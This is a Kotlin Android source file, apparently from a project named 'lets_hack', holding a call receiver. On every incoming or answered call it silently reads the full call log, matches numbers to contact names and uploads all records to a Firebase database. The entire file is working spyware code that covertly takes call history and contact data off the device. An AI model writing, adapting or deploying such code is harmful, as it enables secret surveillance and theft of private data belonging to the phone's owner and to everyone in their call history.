package com.example.lets_hack

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.telephony.TelephonyManager
import com.google.firebase.database.FirebaseDatabase

class CallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return

        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)

        if (state == TelephonyManager.EXTRA_STATE_RINGING || state == TelephonyManager.EXTRA_STATE_OFFHOOK) {
            val callLogs = getCallLogs(context)

            for (call in callLogs) {
                val uniqueKey = "${call.number}-${call.timestamp}"

                FirebaseDatabase.getInstance()
                    .getReference("calls")
                    .child(uniqueKey)  // Use unique key to prevent duplicates
                    .setValue(call)
            }
        }
    }

    private fun getCallLogs(context: Context): List<CallModel> {
        val callList = mutableListOf<CallModel>()
        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(0)
                val type = it.getInt(1)
                val timestamp = it.getLong(2)
                val duration = it.getInt(3)
                val name = getContactName(context, number) ?: "Unknown"

                val call = CallModel(number, name, type, timestamp, duration)
                callList.add(call)
            }
        }
        return callList
    }

    private fun getContactName(context: Context, phoneNumber: String): String? {
        val uri = ContactsContract.PhoneLookup.CONTENT_FILTER_URI.buildUpon()
            .appendPath(phoneNumber)
            .build()

        val cursor = context.contentResolver.query(
            uri,
            arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
            null,
            null,
            null
        )

        return cursor?.use {
            if (it.moveToFirst()) it.getString(0) else null
        }
    }
}